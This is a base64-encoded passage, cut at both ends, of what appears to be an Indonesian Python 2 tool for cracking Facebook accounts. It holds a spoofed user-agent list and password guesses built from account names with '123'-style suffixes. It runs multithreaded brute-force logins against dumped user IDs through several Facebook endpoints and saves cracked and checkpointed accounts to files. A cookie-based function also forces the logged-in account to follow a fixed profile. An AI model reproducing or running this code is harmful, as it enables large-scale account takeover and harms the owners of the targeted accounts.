JpLzUzNy4zNiIsDQogICAgICAgICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc5MzBGIEJ1aWxkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMTI3LjAuMC4yMi42OTtdIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IE1IQS1MMjkgQnVpbGQvSFVBV0VJTUhBLUwyOTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMTI3LjAuMC4yMi42OTtdIiwNCiAgICAgICAiTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxMF8zXzIgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjAzLjIuNCAoS0hUTUwsIGxpa2UgR2Vja28pIE1vYmlsZS8xNEY4OSBbRkJBTi9GQklPUztGQkFWLzk2LjAuMC40NS43MDtGQkJWLzYwNTQ4NTQ1O0ZCRFYvaVBob25lNywyO0ZCTUQvaVBob25lO0ZCU04vaU9TO0ZCU1YvMTAuMy4yO0ZCU1MvMjtGQkNSL0UtUGx1cztGQklEL3Bob25lO0ZCTEMvZGVfREU7RkJPUC81O0ZCUlYvMF0iLA0KICAgICAgICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IEc3LUwwMSBCdWlsZC9IdWF3ZWlHNy1MMDEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zMy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL01FU1NFTkdFUjtGQkFWLzEyMS4wLjAuMTUuNzA7XSIsDQogICAgICAgIkRhbHZpay8yLjEuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IFNNLUozMjBGIEJ1aWxkL0xNWTQ3VikgW0ZCQU4vRkI0QTtGQkFWLzQzLjAuMC4yOS4xNDc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCTEMvZW5fR0I7RkJCVi8xNDI3NDE2MTtGQkNSL1RlbGUyIExUO0ZCTUYvc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJEVi9TTS1KMzIwRjtGQlNWLzUuMDtGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MTkyMH07RkJfRlcvMTtdIiwNCiAgICAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSZWRtaSBOb3RlIDkgUHJvIEJ1aWxkL1FLUTEuMTkxMjE1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85MS4wLjQ0NzIuNzcgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzI1LjAuMC4zNi4xNzA7XSIsDQogICAgICAgIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSJdDQoJcmFuZF91YSA9IHJhbmRvbS5jaG9pY2UodWdlbnQpDQoJcmV0dXJuIHJhbmRfdWENCiMgR0FOVEkgVVNFUiBBR0VOVA0KZGVmIHVzZXJhZ2VudCgpOg0KCXByaW50ICgiXG4lcyVzJXMgMDEgJXNHYW50aSB1c2VyIGFnZW50ICIlKFUsdGlsLFAsTykpDQoJcHJpbnQgKCIlcyVzJXMgMDIgJXNDZWsgdXNlciBhZ2VudCAiJShVLHRpbCxQLE8pKQ0KCXByaW50ICgiJXMlcyVzIDAwICVzS2VtYmFsaSAiJShVLHRpbCxNLE8pKQ0KCV9yb216XyA9IHJhd19pbnB1dCgnXG4lcyMlcyBQaWxpaCVzID4lcyAnJShQLE8sTSxLKSkNCgl1YXMoX3JvbXpfKQ0KZGVmIHVhcyhfcm9tel8pOg0KICAgIGlmIF9yb216XyA9PSAnJzoNCiAgICAgICAgcHJpbnQgJyVzJXMgaXNpIHlhbmcgYmVuYXInJShNLHRpbCk7amVkYSgyKTt1YXMoX3JvbXpfKQ0KICAgIGVsaWYgX3JvbXpfIGluKCIxIiwiMDEiKToNCiAgICAJcHJpbnQgKCIlcyVzJXMgS2V0aWsgJXNNeSB1c2VyIGFnZW50JXMgZGkgYnJvd3NlciBnb29nbGUgY2hyb21lXG4lcyVzJXMgdW50dWsgZ3VuYWthbiB1c2VyIGFnZW50IGFuZGEgc2VuZGlyaSIlKFUsdGlsLE8sSCxPLFUsdGlsLE8pKQ0KICAgIAlwcmludCAoIiVzJXMlcyBLZXRpayAlc0NhbmNlbCVzIHVudHVrIGd1bmFrYW4gdXNlciBhZ2VudCBiYXdhYW4gdG9vbHMiJShVLHRpbCxPLEgsTykpDQogICAgCXRyeToNCiAgICAJICAgIHVhID0gcmF3X2lucHV0KCIlcyVzJXMgRW50ZXIgdXNlciBhZ2VudCAlczogJXMiJShVLHRpbCxPLE0sSykpDQogICAgICAgICAgICBpZiB1YSBpbigiIik6DQogICAgICAgICAgICAJcHJpbnQgKCIlcyVzIGlzaSB5YW5nIGJlbmFyICIlKE0sdGlsKSk7amVkYSgyKTttZW51KCkNCiAgICAgICAgICAgIGVsaWYgdWEgaW4oIm15IHVzZXIgYWdlbnQiLCJNeSBVc2VyIEFnZW50IiwiTVkgVVNFUiBBR0VOVCIsIk15IHVzZXIgYWdlbnQiKToNCiAgICAgICAgICAgIAlqYWxhbigiJXMlcyVzIEFuZGEgYWthbiBkaSBhcmFoa2FuIGtlIGJyb3dzZXIgIiUoVSx0aWwsTykpO2plZGEoMikNCiAgICAgICAgICAgIAlvcy5zeXN0ZW0oImFtIHN0YXJ0IGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9TXkrdXNlcithZ2VudD4vZGV2L251bGwiKTtqZWRhKDIpO3VzZXJhZ2VudChfcm9tel8pDQogICAgICAgICAgICBlbGlmIHVhIGluKCJDQU5DRUwiLCJDYW5jZWwiLCJjYW5jZWwiKToNCiAgICAgICAgICAgIAl1YV8gPSAoIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIikNCiAgICAgICAgICAgICAgICBvcGVuKCJ1YS50eHQiLCJ3Iikud3JpdGUodWFfKTtqZWRhKDIpDQogICAgICAgICAgICAgICAgcHJpbnQgKCJcbiVzJXMgbWVuZ2d1bmFrYW4gdXNlciBhZ2VudCBiYXdhYW4gIiUoSCx0aWwpKTtqZWRhKDIpO21lbnUoKQ0KICAgICAgICAgICAgb3BlbigidWEudHh0IiwidyIpLndyaXRlKHVhKTtqZWRhKDIpDQogICAgICAgICAgICBwcmludCAoIlxuJXMlcyBiZXJoYXNpbCBtZW5nZ2FudGkgdXNlciBhZ2VudCIlKEgsdGlsKSk7amVkYSgyKTttZW51KCkNCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KCQkJZXhpdCAoIlx4MWJbMTs5MW3igKIgRXJyb3IgIikgDQogICAgZWxpZiBfcm9tel8gaW4oIjIiLCIwMiIpOg0KICAgICAgICB0cnk6DQogICAgICAgIAl1YV8gPSBvcGVuKCd1YS50eHQnLCAncicpLnJlYWQoKTtqZWRhKDIpO3ByaW50ICgiJXMlcyVzIHVzZXIgYWdlbnQgYW5kYSVzIDogJXMlcyIlKFUsdGlsLE8sTSxILHVhXykpO2plZGEoMik7cmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSk7bWVudSgpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAJdWFfID0gJyVzLSclKE0pDQogICAgZWxpZiBfcm9tel8gaW4oIjAiLCIwMCIpOg0KICAgIAltZW51KCkNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAoJyVzJXMgaXNpIHlhbmcgYmVuYXInJShNLHRpbCkpO2plZGEoMik7dWFzKF9yb216XykNCiMgU1RBUlQgQ1JBQ0sNCmRlZiBDb21iaW5hdGluKHRleHQpOg0KCWZvciB3IGluIHRleHQuc3BsaXQoIiAiKToNCgkJaWYgbGVuKHcpPDM6DQoJCQljb250aW51ZQ0KCQllbHNlOg0KCQkJdz13Lmxvd2VyKCkNCgkJCWlmIGxlbih3KT09MyBvciBsZW4odyk9PTQgb3IgbGVuKHcpPT01Og0KCQkJCXB3eCA9IFt3KycxMjMnLHcrJzEyMzQnLHcrJzEyMzQ1Jyx3LHRleHQubG93ZXIoKV0NCgkJCWVsc2U6DQoJCQkJcHd4ID0gW3crJzEyMycsdysnMTIzNCcsdysnMTIzNDUnLHddDQoJcmV0dXJuIHB3eA0KZGVmIGlrdXRpX2d3KGt1a2lzKToNCgl0cnk6DQoJCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCQlrdWVoICA9IHsiY29va2llIjprdWtpc30NCgkJcj1wYXJzZXIoc2VzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLzEwMDA2NzgwNzU2NTg2MSIsY29va2llcz1rdWVoKS50ZXh0LCJodG1sLnBhcnNlciIpDQoJCWZvciBpa3V0IGluIHIuZmluZF9hbGwoImEiKToNCgkJCWlmICJCZXJoZW50aSBtZW5naWt1dGkiIGluIHN0cihpa3V0KToNCgkJCQlicmVhaw0KCQkJZWxpZiAiSWt1dGkiIGluIHN0cihpa3V0KToNCgkJCQlzZXMuZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK2lrdXRbImhyZWYiXSxjb29raWVzPWt1ZWgpDQoJZXhjZXB0OiBwYXNzDQpwd3ggPSBbXQ0KY2xhc3MgbmdlbnRvZDoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pZCA9IFtdDQogICAgICAgIHNlbGYub3BzaV9jID0gW10NCiAgICAgICAgc2VsZi5nbSA9IFtdDQogICAgICAgIHNlbGYudWJhaF9wYXNzID0gW10NCiAgICAgICAgc2VsZi5wd2JhcnUgPSBbXQ0KICAgICAgICBzZWxmLnVnZW4gPSBbXQ0KICAgICAgICBzZWxmLnB3QmFydSA9IFtdDQogICAgICAgIHNlbGYudXJsID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSINCiAgICANCiAgICBkZWYgdWJhaHB3KHNlbGYpOg0KCQlwdz1yYXdfaW5wdXQoIiVzJXMlcyB1YmFoIHNhbmRpIGFrdW4gb25lIHRhYj8geS90ICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCgkJaWYgcHcgaW5bJyddOg0KCQkJcHJpbnQoIiVz4oCiIGlzaSB5ZyBiZW5hciBrZW50b2QgIiUoTSkpDQoJCWVsaWYgcHcgaW5bJ3knLCdZJ106DQoJCQlzZWxmLnViYWhfcGFzcy5hcHBlbmQoInViYWgiKQ0KCQkJcHcyPXJhd19pbnB1dCgiJXMlcyVzIG1hc3VrYW4gc2FuZGkgJXM+ICVzIiUoVSx0aWwsTyxNLEspKTtwcmludCcnDQoJCQlpZiBsZW4ocHcyKSA8PSA1Og0KCQkJCWV4aXQoIiVz4oCiIHNhbmRpIG1pbmltYWwgNiBrYXJha3RlciAiJShNKSkNCgkJCWVsc2U6DQoJCQkJc2VsZi5wd2JhcnUuYXBwZW5kKHB3MikNCgkJZWxzZToNCgkJCXBhc3MNCiAgICANCiAgICBkZWYgb3BzaV9jcihzZWxmKToNCiAgICAJamFsYW4gKCJcbiVz4oCiICVzbXVuY3Vsa2FuIG9wc2kgY2hlY2twb2ludCByYXdhbiBzcGFtIGhhbCB5YW5nIHdhamFyIGppa2EgaGFzaWwgbnlhIHNlZGlraXQiJShVLE8pKQ0KICAgIAlvcCA9IHJhd19pbnB1dCgnXG4lc+KAoiVzIGd1bmFrYW4gb3BzaSBjaGVja3BvaW50PyB5L3QlcyA+ICVzJyUoVSxPLE0sSykpDQogICAgICAgIGlmIG9wID09Jyc6DQogICAgICAgIAlwcmludCgiJXPigKIgSXNpIHlhbmcgYmVuYXIga2VudG9kICIlKE0pKTtzZWxmLm9wc2lfY3IoKQ0KICAgICAgICBlbGlmIG9wIGluWydZJywneSddOg0KICAgICAgICAJc2VsZi5vcHNpX2MuYXBwZW5kKCJtdW5jdWwiKQ0KICAgICAgICAJc2VsZi51YmFocHcoKQ0KICAgICAgICBlbGlmIG9wIGluWyd0JywnVCddOg0KICAgICAgICAJc2VsZi5vcHNpX2MuYXBwZW5kKCJna19tdW5jdWwiKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICANCiAgICBkZWYgdWFfcmFuKHNlbGYpOg0KICAgIAlvcCA9IHJhd19pbnB1dCgnJXPigKIlcyBpbmdpbiBndW5ha2FuIHVhIHJhbmRvbT8geS90JXMgPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICBpZiBvcCA9PScnOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICAgICAgZWxpZiBvcCBpblsnWScsJ3knXToNCiAgICAgICAgCXNlbGYudWdlbi5hcHBlbmQoInJhbmRvbSIpDQogICAgICAgIGVsaWYgb3AgaW5bJ3QnLCdUJ106DQogICAgICAgIAlzZWxmLnVnZW4uYXBwZW5kKCJna19yYW5kb20iKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICANCiAgICBkZWYgcm9taXkoc2VsZik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGphbGFuICgiXG4lc+KAoiAlc3NlYmVsdW0gY3JhY2sgYW5kYSB3YWppYiBkdW1wIGlkIHRlcmxlYmloIGRhaHVsdSBwaWxpaCBhbnRhcmEgbWVudSAlczEtNiIlKFUsTyxQKSkNCiAgICAgICAgICAgIHNlbGYuYXBrID0gcmF3X2lucHV0KCdcbiVz4oCiJXMgZmlsZSBkdW1wICVzPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICAgICAgc2VsZi5pZCA9IG9wZW4oc2VsZi5hcGspLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgICAgIHByaW50ICgnJXPigKIlcyBqdW1sYWggSWQlcyA+ICVzJXMnICUoVSxPLE0sSCxsZW4oc2VsZi5pZCkpKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgRmlsZSBkdW1wIHRpZGFrIGFkYSwgZHVtcCBpZCBkdWx1IGtlbnRvZCclKE0pKQ0KICAgICAgICAgICAgcmF3X2lucHV0KCdcbiVz4oCiICVzWyAlc2VudGVyICVzXSAnJShVLE8sVSxPKSk7bWVudSgpDQogICAgICAgIHNlbGYub3BzaV9jcigpDQogICAgICAgIHNlbGYudWFfcmFuKCkNCiAgICAgICAgdW5pa2VycyA9IHJhd19pbnB1dCgnJXPigKIlcyBndW5ha2FuIHBhc3N3b3JkIG1hbnVhbD8geS90JXMgPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICBpZiB1bmlrZXJzIGluICgnWScsICd5Jyk6DQogICAgICAgICAgICBwcmludCAoJ1xuJXPigKIlcyBjb250b2glcyA+JXMgc2F5YW5nJXMsJXNwZW5nZW4lcywlc25nZW50b3QnJShVLE8sTSxPLE0sTyxNLE8pKQ0KICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICBwd3ggPSByYXdfaW5wdXQoJyVz4oCiJXMgcGFzc3dvcmQgJXM+ICVzJyUoVSxPLE0sSykpDQogICAgICAgICAgICAgICAgaWYgcHd4ID09ICcnOg0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgamFuZ2FuIGtvc29uZyAnJShNKSkNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihwd3gpPD01Og0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgcGFzc3dvcmQgbWluaW1hbCA2IGthcmFrdGVyJyUoTSkpO2V4aXQoKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGRlZiBtYW51YWwoYnJ1dGU9Tm9uZSk6DQogICAgICAgICAgICAgICAgICAgICAgICBpbmQgPSByYXdfaW5wdXQoJ1xuJXMjJXMgUGlsaWggJXM+JXMgJyUoUCxPLE0sSykpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpbmQgPT0gJyc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7bWFudWFsKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgaW5kIGluICgnMScsICcwMScpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnXG4lcyVzJXMgYWt1biAlc1tPS10gJXN0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNPSy8lcy50eHQnJShVLHRpbCxPLEgsTyxNLEgsd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJyVzJXMlcyBha3VuICVzWyVzQ1Alc10lcyB0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNDUC8lcy50eHQnJShVLHRpbCxPLE0sSyxNLE8sTSxLLHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgamFsYW4gKCdcbiVzISVzIG1haW5rYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgamlrYSBsYW1hIGhhc2lsIFxuJyUoVSxPKSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGxvZzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFrdW4gaW4gc2VsZi5pZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfaGVja18gPSBha3VuLnNwbGl0KCc8PT4nKVswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5zdWJtaXQoc2VsZi5iX2FwaSwgX2hlY2tfLCBicnV0ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIlc+KAoiBmaW5pc2hlZCIlKEgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBpbmQgaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdcbiVzJXMlcyBha3VuICVzW09LXSAlc3RlcnNpbXBhbiBrZSBmaWxlICVzPiAlc09LLyVzLnR4dCclKFUsdGlsLE8sSCxPLE0sSCx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnJXMlcyVzIGFrdW4gJXNbJXNDUCVzXSVzIHRlcnNpbXBhbiBrZSBmaWxlICVzPiAlc0NQLyVzLnR4dCclKFUsdGlsLE8sTSxLLE0sTyxNLEssd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYWxhbiAoJ1xuJXMhJXMgbWFpbmthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayBqaWthIGxhbWEgaGFzaWwgXG4nJShVLE8pKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgbG9nOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYWt1biBpbiBzZWxmLmlkOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9oZWNrXyA9IGFrdW4uc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nLnN1Ym1pdChzZWxmLmJhc2ljLCBfaGVja18sIGJydXRlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiVz4oCiIGZpbmlzaGVkIiUoSCkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGluZCBpbiAoJzMnLCAnMDMnKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXMlcyVzIGFrdW4gJXNbT0tdICVzdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzT0svJXMudHh0JyUoVSx0aWwsTyxILE8sTSxILHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclcyVzJXMgYWt1biAlc1slc0NQJXNdJXMgdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzQ1AvJXMudHh0JyUoVSx0aWwsTyxNLEssTSxPLE0sSyx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGphbGFuICgnXG4lcyElcyBtYWlua2FuIG1vZGUgcGVzYXdhdCAyIGRldGlrIGppa2EgbGFtYSBoYXNpbCBcbiclKFUsTykpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBsb2c6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBha3VuIGluIHNlbGYuaWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX2hlY2tfID0gYWt1bi5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2cuc3VibWl0KHNlbGYubW9iaWwsIF9oZWNrXywgYnJ1dGUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiJXPigKIgZmluaXNoZWQiJShIKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdcbiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCclKE0pKTttYW51YWwoKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIlcyBbICVzcGlsaWggbWV0aG9kZSBsb2dpbiwgc2lsYWhrYW4gY29iYSBzYXR1wrIgJXNdXG4nJShVLE8sVSxPKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclc+KAoiAlczAxJXMgbWV0aG9kZSAlc2ItYXBpICVzKGNlcGF0KSAnJShVLFAsTyxNLE8pKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDIlcyBtZXRob2RlICVzbWJhc2ljICVzKGxhbWJhdCkgJyUoVSxQLE8sUCxPKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclc+KAoiAlczAzJXMgbWV0aG9kZSAlc21vYmlsZSAlcyhsYW1iYXQpICVzUHJvJyUoVSxQLE8sSCxPLEgpKQ0KICAgICAgICAgICAgICAgICAgICBtYW51YWwocHd4LnNwbGl0KCcsJykpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsaWYgdW5pa2VycyBpbiAoJ1QnLCAndCcpOg0KICAgICAgICAgICAgcHJpbnQgKCdcbiVz4oCiJXMgWyAlc3BpbGloIG1ldGhvZGUgbG9naW4sIHNpbGFoa2FuIGNvYmEgc2F0dcKyJXMgXVxuJyUoVSxPLFUsTykpDQogICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDElcyBtZXRob2RlICVzYi1hcGkgJXMoY2VwYXQpJyUoVSxQLE8sTSxPKSkNCiAgICAgICAgICAgIHByaW50ICgnJXPigKIgJXMwMiVzIG1ldGhvZGUgJXNtYmFzaWMgJXMobGFtYmF0KSclKFUsUCxPLFAsTykpDQogICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDMlcyBtZXRob2RlICVzbW9iaWxlICVzKGxhbWJhdCkgJXNQcm8nJShVLFAsTyxILE8sSCkpDQogICAgICAgICAgICBzZWxmLmxhbmdzdW5nKCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCIlc+KAoiBJc2kgeWFuZyBiZW5hciBrZW50b2QgIiUoTSkpO2plZGEoMik7bWVudSgpDQogICAgIyBMQU5HU1VORw0KICAgIGRlZiBsYW5nc3VuZyhzZWxmKToNCiAgICAJZ2xvYmFsIHB3eA0KICAgICAgICBzdXV1ID0gcmF3X2lucHV0KCdcbiVzIyVzIFBpbGloICVzPiVzICclKFAsTyxNLEspKQ0KICAgICAgICBpZiBzdXV1ID09ICcnOg0KICAgICAgICAgICAgcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5sYW5nc3VuZygpDQogICAgICAgIGVsaWYgc3V1dSBpbiAoJzEnLCAnMDEnKToNCiAgICAgICAgICAgIHByaW50ICgnXG4lcyVzJXMgYWt1biAlc1tPS10gJXN0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNPSy8lcy50eHQnJShVLHRpbCxPLEgsTyxNLEgsd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgIHByaW50ICgnJXMlcyVzIGFrdW4gJXNbJXNDUCVzXSVzIHRlcnNpbXBhbiBrZSBmaWxlICVzPiAlc0NQLyVzLnR4dCclKFUsdGlsLE8sTSxLLE0sTyxNLEssd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgIGphbGFuICgnXG4lcyElcyBtYWlua2FuIG1vZGUgcGVzYXdhdCAyIGRldGlrIGppa2EgbGFtYSBoYXNpbCBcbiclKFUsTykpO2plZGEoMC4yKQ0KICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGxvZzoNCiAgICAgICAgICAgIAlmb3IgYWt1biBpbiBzZWxmLmlkOiANCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9IGFrdW4uc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICBwdyA9IGFrdW4uc3BsaXQoJzw9PicpWzFdDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdyBpbiBwdy5zcGxpdCgiICIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbih3KTwzO